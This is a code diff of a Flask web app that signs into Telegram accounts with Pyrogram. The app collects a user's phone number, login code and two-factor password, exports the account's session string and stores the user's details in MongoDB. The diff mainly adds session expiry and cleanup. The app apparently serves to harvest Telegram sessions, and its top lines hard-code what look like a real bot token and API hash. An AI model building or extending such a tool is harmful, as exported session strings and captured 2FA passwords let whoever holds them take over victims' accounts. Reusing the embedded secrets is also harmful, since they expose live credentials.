@@ -56,17 +56,52 @@ API_HASH = os.environ.get("API_HASH", "628f11c05a44c8dda4b006e66f4bf7df")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8991327348:AAH3uOzXU8aZZ2LKfUlK1MH4Wp2AYKo1aIs")
 CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1004376082945")
 
+# Thread-safe session storage with expiration
 clients = {}
 clients_lock = threading.Lock()
+session_timestamps = {}  # Track when sessions were created
+
+def cleanup_old_sessions():
+    """Remove sessions older than 10 minutes"""
+    cutoff = datetime.now() - timedelta(minutes=10)
+    with clients_lock:
+        expired = [sid for sid, ts in session_timestamps.items() if ts < cutoff]
+        for sid in expired:
+            if sid in clients:
+                try:
+                    client_data = clients[sid]
+                    # Run disconnect in separate thread to avoid event loop issues
+                    threading.Thread(target=disconnect_client_safely, 
+                                   args=(client_data["client"],), 
+                                   daemon=True).start()
+                except:
+                    pass
+                clients.pop(sid, None)
+            session_timestamps.pop(sid, None)
+
+def disconnect_client_safely(client):
+    """Safely disconnect a client"""
+    try:
+        if client.is_connected:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            loop.run_until_complete(client.disconnect())
+            loop.close()
+    except:
+        pass
 
 def run_async(coro):
-    """Run async code properly"""
+    """Run async code with proper event loop handling"""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
     try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
         return loop.run_until_complete(coro)
     finally:
-        loop.close()
+        try:
+            loop.run_until_complete(loop.shutdown_asyncgens())
+            loop.close()
+        except:
+            pass
 
 # ========== DATABASE HELPERS ==========
 def save_session_to_db(session_data):
@@ -230,6 +265,9 @@ def login():
 
 @app.route("/api/send-code", methods=["POST"])
 def send_code():
+    # Cleanup old sessions before creating new one
+    cleanup_old_sessions()
+    
     data = request.get_json() or {}
     phone = data.get("phone", "").strip()
     session_name = data.get("session_name", "session").strip()
@@ -238,7 +276,7 @@ def send_code():
         return jsonify(ok=False, error="Invalid phone number"), 400
 
     session_id = str(uuid.uuid4())[:8]
-    
+
     async def send_code_async():
         client = Client(
             name=f"session_{session_id}",
@@ -247,11 +285,11 @@ def send_code():
             in_memory=True,
             no_updates=True
         )
-        
+
         try:
             await client.connect()
             sent = await client.send_code(phone)
-            
+
             with clients_lock:
                 clients[session_id] = {
                     "client": client,
@@ -259,30 +297,36 @@ def send_code():
                     "session_name": session_name,
                     "phone_code_hash": sent.phone_code_hash
                 }
+                session_timestamps[session_id] = datetime.now()
             return {"ok": True, "session_id": session_id, "message": f"Code sent to {phone}"}
         except PhoneNumberInvalid:
-            await client.disconnect()
             return {"ok": False, "error": "Invalid phone number"}
         except FloodWait as e:
-            await client.disconnect()
             return {"ok": False, "error": f"Wait {e.value} seconds"}
         except Exception as e:
-            await client.disconnect()
             return {"ok": False, "error": str(e)}
-    
+        finally:
+            # Don't disconnect here - we need to keep client alive for verification
+            pass
+
     result = run_async(send_code_async())
-    
-    if result.get("ok"):
-        return jsonify(result)
-    else:
+
+    if not result.get("ok"):
+        # Clean up if failed
+        with clients_lock:
+            clients.pop(session_id, None)
+            session_timestamps.pop(session_id, None)
+        
         status_code = 400 if "Invalid" in result.get("error", "") else 429 if "Wait" in result.get("error", "") else 500
         return jsonify(result), status_code
+
+    return jsonify(result)
 
 @app.route("/api/verify-code", methods=["POST"])
 def verify_code():
     data = request.get_json() or {}
     session_id = data.get("session_id", "")
-    code = data.get("code", "").strip().replace(" ", "")  # Remove spaces from code
+    code = data.get("code", "").strip().replace(" ", "")
     password = data.get("password", "")
 
     if not session_id:
@@ -290,9 +334,9 @@ def verify_code():
 
     with clients_lock:
         client_data = clients.get(session_id)
-    
+
     if not client_data:
-        return jsonify(ok=False, error="Session expired. Please try again."), 400
+        return jsonify(ok=False, error="Session expired. Please request a new code."), 400
 
     if not code or not code.isdigit():
         return jsonify(ok=False, error="Please enter a valid verification code"), 400
@@ -304,45 +348,53 @@ def verify_code():
 
     async def verify_async():
         try:
+            user = await client.sign_in(
+                phone_number=phone,
+                phone_code_hash=phone_code_hash,
+                phone_code=code
+            )
+            session_string = await client.export_session_string()
+            return {"user": user, "session_string": session_string, "error": None}
+        except SessionPasswordNeeded:
+            if not password:
+                return {"user": None, "session_string": None, "error": "2FA_PASSWORD_REQUIRED"}
             try:
-                user = await client.sign_in(
-                    phone_number=phone,
-                    phone_code_hash=phone_code_hash,
-                    phone_code=code
-                )
-                session_string = await client.export_session_string()
-                await client.disconnect()
-                return {"user": user, "session_string": session_string, "error": None}
-            except SessionPasswordNeeded:
-                if not password:
-                    return {"user": None, "session_string": None, "error": "2FA_PASSWORD_REQUIRED"}
                 user = await client.check_password(password)
                 session_string = await client.export_session_string()
-                await client.disconnect()
                 return {"user": user, "session_string": session_string, "error": None}
+            except Exception as e:
+                return {"user": None, "session_string": None, "error": f"2FA error: {str(e)}"}
         except PhoneCodeInvalid:
             return {"user": None, "session_string": None, "error": "INVALID_CODE"}
         except PhoneCodeExpired:
             return {"user": None, "session_string": None, "error": "CODE_EXPIRED"}
         except Exception as e:
             return {"user": None, "session_string": None, "error": str(e)}
+        finally:
+            try:
+                await client.disconnect()
+            except:
+                pass
 
     result = run_async(verify_async())
-    
+
+    # Clean up session regardless of result
+    with clients_lock:
+        clients.pop(session_id, None)
+        session_timestamps.pop(session_id, None)
+
     if result["error"] == "2FA_PASSWORD_REQUIRED":
         return jsonify(ok=False, requires_password=True), 401
     elif result["error"] == "INVALID_CODE":
         return jsonify(ok=False, error="Invalid verification code. Please check and try again."), 401
     elif result["error"] == "CODE_EXPIRED":
-        with clients_lock:
-            clients.pop(session_id, None)
         return jsonify(ok=False, error="Code expired. Please request a new code."), 401
     elif result["error"]:
         return jsonify(ok=False, error=result["error"]), 500
 
     user = result["user"]
     session_string = result["session_string"]
-    
+
     user_info = {
         "id": user.id,
         "first_name": user.first_name,
@@ -357,9 +409,6 @@ def verify_code():
     db_id = save_session_to_db(user_info)
     if db_id:
         print(f"✅ User saved to MongoDB with ID: {db_id}")
-
-    with clients_lock:
-        clients.pop(session_id, None)
 
     country_code = phone[:3] if phone.startswith("+") else phone[:2]
 
